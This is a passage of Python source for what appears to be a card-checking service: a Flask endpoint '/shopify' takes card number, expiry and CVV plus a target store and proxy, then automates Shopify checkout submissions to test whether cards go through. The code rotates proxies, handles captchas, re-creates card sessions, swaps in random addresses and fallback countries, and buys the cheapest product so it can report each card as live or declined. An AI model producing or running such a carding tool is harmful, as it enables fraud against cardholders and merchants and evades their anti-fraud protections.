                                    _, _ts, _ = await make_graphql_request_with_captcha_handling(
                                        session, graphql_url, {'operationName': 'SubmitForCompletion'}, headers, _nsd, checkout_url, max_retries=1, proxy=proxy
                                    )
                                    if not _ts or not _ts.strip() or _ts.strip().lower().startswith('<'):
                                        return False, "Delivery options changed, please retry", _new_tp
                                    _js = json.loads(_ts)
                                    _sds = _js.get('data', {}).get('submitForCompletion', {})
                                    _rts = _sds.get('__typename', '')
                                    if _rts in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                                        _rcs = _sds.get('receipt', {})
                                        if _rcs and _rcs.get('__typename') == 'ProcessedReceipt':
                                            return True, "ORDER_PLACED", _new_tp
                                        _rid2 = _rcs.get('id')
                                        if _rid2:
                                            # Inline poll
                                            await asyncio.sleep(3)
                                            _pp = {'operationName': 'PollForReceipt'}
                                            _pd = {'query': QUERY_POLL, 'variables': {'receiptId': _rid2, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                                            for _ in range(4):
                                                _, _pt, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, _pp, headers, _pd, checkout_url, max_retries=1, proxy=proxy)
                                                if is_captcha_required(_pt):
                                                    return True, "CARD_DECLINED", _new_tp
                                                try:
                                                    _pj = json.loads(_pt)
                                                    _prd = _pj.get('data', {}).get('receipt', {})
                                                    if _prd:
                                                        _ptn = _prd.get('__typename', '')
                                                        if _ptn == 'ProcessedReceipt':
                                                            return True, "ORDER_PLACED", _new_tp
                                                        elif _ptn == 'FailedReceipt':
                                                            _pe = _prd.get('processingError', {})
                                                            _pet = _pe.get('__typename', '')
                                                            if _pet == 'PaymentFailed':
                                                                _pc = _pe.get('code', '')
                                                                _pm = _pe.get('messageUntranslated', '')
                                                                if _pc in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and _pm:
                                                                    return True, _pm, _new_tp
                                                                return True, _pc if _pc else 'PAYMENT_FAILED', _new_tp
                                                            return True, _pe.get('code') or _pet or 'UNKNOWN_ERROR', _new_tp
                                                        elif _ptn == 'ActionRequiredReceipt':
                                                            return True, "OTP_REQUIRED", _new_tp
                                                        if _ptn in ('ProcessingReceipt', 'WaitingReceipt'):
                                                            await asyncio.sleep(4); continue
                                                except Exception:
                                                    pass
                                                if 'WaitingReceipt' in _pt:
                                                    await asyncio.sleep(4)
                                                else:
                                                    break
                                            return False, "Poll timeout", _new_tp
                                    elif _rts == 'SubmitRejected':
                                        _es = (_sds.get('errors') or [{}])[0]
                                        _cs = _es.get('localizedMessage') or _es.get('nonLocalizedMessage') or _es.get('code', 'DECLINED')
                                        _cs_chk = (_cs + ' ' + _es.get('code', '').replace('_', ' ')).lower()
                                        if 'missing credit card session' in _cs_chk or 'credit card session information' in _cs_chk:
                                            _cs = 'CARD_DECLINED'
                                        return False, _cs, _new_tp
                                    elif _rts == 'SubmitFailed':
                                        return False, _sds.get('reason', 'Payment failed'), _new_tp
                                    return False, "Delivery options changed, please retry", _new_tp
                                try:
                                    _ok, _msg, _tp2 = await _reprop_and_submit()
                                    return _ok, _msg, gateway, _tp2, currency
                                except Exception:
                                    pass
                                return False, "Delivery options changed, please retry", gateway, total_price, currency
                            # Handle ORDER_TOTAL_CHANGED: extract new total from sellerProposal and retry
                            if code == 'ORDER_TOTAL_CHANGED':
                                _new_total3 = None
                                _seller3 = submit_data.get('sellerProposal', {})
                                for _k3 in ('runningTotal', 'totalAmount', 'total'):
                                    _v3 = _seller3.get(_k3, {})
                                    if isinstance(_v3, dict): _v3 = _v3.get('value', _v3)
                                    if isinstance(_v3, dict): _v3 = _v3.get('amount')
                                    if _v3 and str(_v3).replace('.', '', 1).isdigit():
                                        _new_total3 = str(_v3); break
                                if not _new_total3:
                                    # Regex fallback on raw text
                                    _m3 = re.search(r'"(?:runningTotal|totalAmount)"[^}]{0,200}?"amount"\s*:\s*"([0-9]+\.[0-9]+)"', text)
                                    if _m3: _new_total3 = _m3.group(1)
                                if _new_total3:
                                    running_total = _new_total3
                                    total_price   = _new_total3
                                    try:
                                        submit_json_data['variables'] = submit_variables
                                        _r3, _t3, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, params, headers, submit_json_data,
                                            checkout_url, max_retries=1, proxy=proxy
                                        )
                                        if _t3 and _t3.strip() and not _t3.strip().lower().startswith('<'):
                                            _j3 = json.loads(_t3)
                                            _sd3 = _j3.get('data', {}).get('submitForCompletion', {})
                                            _rt3 = _sd3.get('__typename', '')
                                            if _rt3 in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                                                _rc3 = _sd3.get('receipt', {})
                                                if _rc3 and _rc3.get('__typename') == 'ProcessedReceipt':
                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                _rid3 = _rc3.get('id')
                                                if _rid3:
                                                    # Inline poll — can't break to outer poll from here
                                                    await asyncio.sleep(3)
                                                    _pp3 = {'operationName': 'PollForReceipt'}
                                                    _pd3 = {'query': QUERY_POLL, 'variables': {'receiptId': _rid3, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                                                    for _ in range(4):
                                                        _, _pt3, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, _pp3, headers, _pd3, checkout_url, max_retries=1, proxy=proxy)
                                                        if is_captcha_required(_pt3):
                                                            return True, "CARD_DECLINED", gateway, total_price, currency
                                                        try:
                                                            _pj3 = json.loads(_pt3)
                                                            _prd3 = _pj3.get('data', {}).get('receipt', {})
                                                            if _prd3:
                                                                _ptn3 = _prd3.get('__typename', '')
                                                                if _ptn3 == 'ProcessedReceipt':
                                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                                elif _ptn3 == 'FailedReceipt':
                                                                    _pe3 = _prd3.get('processingError', {})
                                                                    _pet3 = _pe3.get('__typename', '')
                                                                    if _pet3 == 'PaymentFailed':
                                                                        _pc3 = _pe3.get('code', '')
                                                                        _pm3 = _pe3.get('messageUntranslated', '')
                                                                        if _pc3 in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and _pm3:
                                                                            return True, _pm3, gateway, total_price, currency
                                                                        return True, _pc3 if _pc3 else 'PAYMENT_FAILED', gateway, total_price, currency
                                                                    return True, _pe3.get('code') or _pet3 or 'UNKNOWN_ERROR', gateway, total_price, currency
                                                                elif _ptn3 == 'ActionRequiredReceipt':
                                                                    return True, "OTP_REQUIRED", gateway, total_price, currency
                                                                if _ptn3 in ('ProcessingReceipt', 'WaitingReceipt'):
                                                                    await asyncio.sleep(4); continue
                                                        except Exception:
                                                            pass
                                                        if 'WaitingReceipt' in _pt3:
                                                            await asyncio.sleep(4)
                                                        else:
                                                            break
                                            elif _rt3 == 'SubmitRejected':
                                                _e3 = (_sd3.get('errors') or [{}])[0]
                                                _c3 = _e3.get('localizedMessage') or _e3.get('nonLocalizedMessage') or _e3.get('code', 'DECLINED')
                                                _c3_chk = (_c3 + ' ' + _e3.get('code', '').replace('_', ' ')).lower()
                                                if 'missing credit card session' in _c3_chk or 'credit card session information' in _c3_chk:
                                                    _c3 = 'CARD_DECLINED'
                                                return False, _c3, gateway, total_price, currency
                                            elif _rt3 == 'SubmitFailed':
                                                return False, _sd3.get('reason', 'Payment failed'), gateway, total_price, currency
                                    except Exception:
                                        pass
                                return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                            localized_msg = error.get('localizedMessage', '')
                            non_localized_msg = error.get('nonLocalizedMessage', '')
                            detail = localized_msg or non_localized_msg or ''
                            # Check both human-readable detail AND the raw code (normalised to spaces)
                            # to catch e.g. code='MISSING_CREDIT_CARD_SESSION_INFORMATION' with no localizedMessage
                            _cc_check = (detail + ' ' + code.replace('_', ' ')).lower()
                            # Re-vault and retry when session token is missing/expired
                            if 'missing credit card session' in _cc_check or 'credit card session information' in _cc_check:
                                try:
                                    async with session.post(
                                        'https://checkout.pci.shopifyinc.com/sessions',
                                        json=payload, headers=vault_headers, proxy=proxy
                                    ) as _vr:
                                        _vtd = await _vr.json()
                                    _new_tok = _vtd.get('id')
                                    if _new_tok:
                                        # Patch fresh token into submit and retry
                                        submit_variables['input']['payment']['paymentLines'][0]['paymentMethod']['directPaymentMethod']['sessionId'] = _new_tok
                                        submit_json_data['variables'] = submit_variables
                                        _, _tv, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, params, headers, submit_json_data,
                                            checkout_url, max_retries=1, proxy=proxy
                                        )
                                        if _tv and _tv.strip() and not _tv.strip().lower().startswith('<'):
                                            _jv = json.loads(_tv)
                                            _sdv = _jv.get('data', {}).get('submitForCompletion', {})
                                            _rtv = _sdv.get('__typename', '')
                                            if _rtv in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                                                _rcv = _sdv.get('receipt', {})
                                                if _rcv and _rcv.get('__typename') == 'ProcessedReceipt':
                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                _ridv = _rcv.get('id')
                                                if _ridv:
                                                    await asyncio.sleep(3)
                                                    _ppv = {'operationName': 'PollForReceipt'}
                                                    _pdv = {'query': QUERY_POLL, 'variables': {'receiptId': _ridv, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                                                    for _ in range(4):
                                                        _, _ptv, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, _ppv, headers, _pdv, checkout_url, max_retries=1, proxy=proxy)
                                                        if is_captcha_required(_ptv):
                                                            return True, "CARD_DECLINED", gateway, total_price, currency
                                                        try:
                                                            _pjv = json.loads(_ptv)
                                                            _prdv = _pjv.get('data', {}).get('receipt', {})
                                                            if _prdv:
                                                                _ptnv = _prdv.get('__typename', '')
                                                                if _ptnv == 'ProcessedReceipt':
                                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                                elif _ptnv == 'FailedReceipt':
                                                                    _pev = _prdv.get('processingError', {})
                                                                    _petv = _pev.get('__typename', '')
                                                                    if _petv == 'PaymentFailed':
                                                                        _pcv = _pev.get('code', '')
                                                                        _pmv = _pev.get('messageUntranslated', '')
                                                                        if _pcv in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and _pmv:
                                                                            return True, _pmv, gateway, total_price, currency
                                                                        return True, _pcv if _pcv else 'PAYMENT_FAILED', gateway, total_price, currency
                                                                    return True, _pev.get('code') or _petv or 'UNKNOWN_ERROR', gateway, total_price, currency
                                                                elif _ptnv == 'ActionRequiredReceipt':
                                                                    return True, "OTP_REQUIRED", gateway, total_price, currency
                                                                if _ptnv in ('ProcessingReceipt', 'WaitingReceipt'):
                                                                    await asyncio.sleep(4); continue
                                                        except Exception:
                                                            pass
                                                        if 'WaitingReceipt' in _ptv:
                                                            await asyncio.sleep(4)
                                                        else:
                                                            break
                                            elif _rtv == 'SubmitRejected':
                                                # Retry also failed — check if it's a real bank decline or same session error
                                                _ev = (_sdv.get('errors') or [{}])[0]
                                                _ev_code = _ev.get('code', '')
                                                _ev_detail = _ev.get('localizedMessage') or _ev.get('nonLocalizedMessage') or ''
                                                _ev_check = (_ev_detail + ' ' + _ev_code.replace('_', ' ')).lower()
                                                if 'missing credit card session' in _ev_check or 'credit card session information' in _ev_check:
                                                    # Still same error — treat as site error for retry on new store
                                                    return False, "Card session expired, please retry", gateway, total_price, currency
                                                return False, _ev_detail or _ev_code or 'DECLINED', gateway, total_price, currency
                                            elif _rtv == 'SubmitFailed':
                                                return False, _sdv.get('reason', 'Payment failed'), gateway, total_price, currency
                                except Exception:
                                    pass
                                return False, "Card session expired, please retry", gateway, total_price, currency
                            # Map raw Shopify codes to clean human-readable messages
                            _CODE_MAP = {
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE':
                                    'No delivery available (site ships locally only)',
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE':
                                    'No delivery available (site ships locally only)',
                                'REQUIRED_ARTIFACTS_UNAVAILABLE':
                                    'Checkout requirements not met',
                            }
                            if code in _CODE_MAP:
                                # Digital checkout blocked by store extension → retry with cheapest physical
                                if (code == 'REQUIRED_ARTIFACTS_UNAVAILABLE'
                                        and not _requires_shipping
                                        and not _tried_digital):
                                    # First, try resubmitting the SAME digital proposal once more.
                                    # This artifact-availability check is often a one-shot session
                                    # warm-up issue on Shopify's side, not a hard block — the exact
                                    # same payload frequently succeeds on a second attempt.
                                    try:
                                        await asyncio.sleep(2)
                                        _retry_resp, _retry_text, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, params, headers, submit_json_data,
                                            checkout_url, max_retries=1, proxy=proxy
                                        )
                                        if (_retry_text and _retry_text.strip()
                                                and not _retry_text.strip()[:15].lower().startswith(('<', '<!d'))
                                                and not is_captcha_required(_retry_text)):
                                            _rj = json.loads(_retry_text)
                                            _rsd = _rj.get('data', {}).get('submitForCompletion', {})
                                            _rtn = _rsd.get('__typename', '')
                                            if _rtn in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                                                _rrc = _rsd.get('receipt', {})
                                                if _rrc and _rrc.get('__typename') == 'ProcessedReceipt':
                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                _rrid = _rrc.get('id')
                                                if _rrid:
                                                    await asyncio.sleep(3)
                                                    _rpp = {'operationName': 'PollForReceipt'}
                                                    _rpd = {'query': QUERY_POLL, 'variables': {'receiptId': _rrid, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
                                                    for _ in range(4):
                                                        _, _rpt, _ = await make_graphql_request_with_captcha_handling(session, graphql_url, _rpp, headers, _rpd, checkout_url, max_retries=1, proxy=proxy)
                                                        if is_captcha_required(_rpt):
                                                            return True, "CARD_DECLINED", gateway, total_price, currency
                                                        try:
                                                            _rpj = json.loads(_rpt)
                                                            _rprd = _rpj.get('data', {}).get('receipt', {})
                                                            if _rprd:
                                                                _rptn = _rprd.get('__typename', '')
                                                                if _rptn == 'ProcessedReceipt':
                                                                    return True, "ORDER_PLACED", gateway, total_price, currency
                                                                elif _rptn == 'FailedReceipt':
                                                                    _rpe = _rprd.get('processingError', {})
                                                                    _rpet = _rpe.get('__typename', '')
                                                                    if _rpet == 'PaymentFailed':
                                                                        _rpc = _rpe.get('code', '')
                                                                        _rpm = _rpe.get('messageUntranslated', '')
                                                                        if _rpc in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and _rpm:
                                                                            return True, _rpm, gateway, total_price, currency
                                                                        return True, _rpc if _rpc else 'PAYMENT_FAILED', gateway, total_price, currency
                                                                    return True, _rpe.get('code') or _rpet or 'UNKNOWN_ERROR', gateway, total_price, currency
                                                                elif _rptn == 'ActionRequiredReceipt':
                                                                    return True, "OTP_REQUIRED", gateway, total_price, currency
                                                                if _rptn in ('ProcessingReceipt', 'WaitingReceipt'):
                                                                    await asyncio.sleep(4); continue
                                                        except Exception:
                                                            pass
                                                        if 'WaitingReceipt' in _rpt:
                                                            await asyncio.sleep(4)
                                                        else:
                                                            break
                                            elif _rtn == 'SubmitRejected':
                                                _re = (_rsd.get('errors') or [{}])[0]
                                                _rcode = _re.get('code', '')
                                                # If the retry hit a DIFFERENT error (e.g. delivery/session
                                                # renegotiation), let the outer logic handle it naturally by
                                                # falling through to the physical-fallback path below only
                                                # if it's still the same artifact block.
                                                if _rcode != 'REQUIRED_ARTIFACTS_UNAVAILABLE':
                                                    _rdetail = _re.get('localizedMessage') or _re.get('nonLocalizedMessage') or ''
                                                    if _rcode in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and _rdetail:
                                                        return False, _rdetail, gateway, total_price, currency
                                                    if _rcode:
                                                        return False, _CODE_MAP.get(_rcode, _rcode), gateway, total_price, currency
                                            elif _rtn == 'SubmitFailed':
                                                return False, _rsd.get('reason', 'Payment failed'), gateway, total_price, currency
                                    except Exception:
                                        pass
                                    # Same-item retry didn't resolve it — fall back to cheapest physical
                                    # product so we can still return a real card response.
                                    _pi = await fetch_products(ourl, proxy_str, physical_only=True)
                                    if isinstance(_pi, dict) and _pi.get('variant_id'):
                                        return await process_card(
                                            cc, mes, ano, cvv, ourl,
                                            variant_id=_pi['variant_id'],
                                            proxy_str=proxy_str,
                                            _tried_digital=True
                                        )
                                # Before giving up on delivery, try a fallback country address
                                if (code in ('DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
                                             'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE')
                                        and not _delivery_retried[0]):
                                    _FALLBACK_CC = {
                                        'NZ': 'AU', 'AU': 'US', 'GB': 'US', 'DE': 'US',
                                        'FR': 'US', 'JP': 'US', 'IN': 'US', 'SG': 'US',
                                        'HK': 'US', 'CN': 'US', 'AE': 'US', 'CA': 'US',
                                        'SE': 'US', 'NO': 'US', 'DK': 'US', 'MX': 'US',
                                        'CH': 'US',
                                    }
                                    _fb_key = _FALLBACK_CC.get(country_code)
                                    if _fb_key and _fb_key in book:
                                        _delivery_retried[0] = True
                                        _fb_entries = book[_fb_key]
                                        _fb_addr = random.choice(_fb_entries) if isinstance(_fb_entries, list) else _fb_entries
                                        _fb_result = await _addr_fallback_submit(_fb_addr)
                                        if _fb_result is not None:
                                            return _fb_result
                                return False, _CODE_MAP[code], gateway, total_price, currency
                            # If code is generic, prefer the localized/non-localized message for the real decline reason
                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                if detail:
                                    return False, detail, gateway, total_price, currency
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await asyncio.sleep(3)
            
            for i in range(4):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data,
                    checkout_url, max_retries=1, proxy=proxy
                )
                
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                # If code is generic, prefer the untranslated message for the real decline reason
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            # Handle other error types
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                        
                except Exception as e:
                    pass
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except:
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, f"OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, f"ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, f"Unknown Result", gateway, total_price, currency

    except aiohttp.ClientError as e:
        # aiohttp-level timeouts come through as ServerTimeoutError (subclass of ClientError)
        if isinstance(e, aiohttp.ServerTimeoutError):
            return False, "TIMEOUT", gateway, total_price, currency
        if proxy:
            # proxy/network failure — retry transparently without proxy
            return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str=None)
        return False, "CARD_DECLINED", gateway, total_price, currency
    except asyncio.TimeoutError:
        # asyncio-level timeout (e.g. from wait_for or aiohttp internal)
        return False, "TIMEOUT", gateway, total_price, currency
    except Exception as e:
        _emsg = str(e) or type(e).__name__
        if "timeout" in _emsg.lower():
            return False, "TIMEOUT", gateway, total_price, currency
        return False, f"Error Processing Card: {_emsg}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)

_app = Flask(__name__)

@_app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']
            mes = cc_parts['mes']
            ano = cc_parts['ano']
            cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        variant_id = request.args.get('variant')
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
            )
        finally:
            loop.close()
        
        clean_response = extract_clean_response(message)
        
        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

if __name__ == "__main__":
    _app.run(host='0.0.0.0', port=5000, debug=False)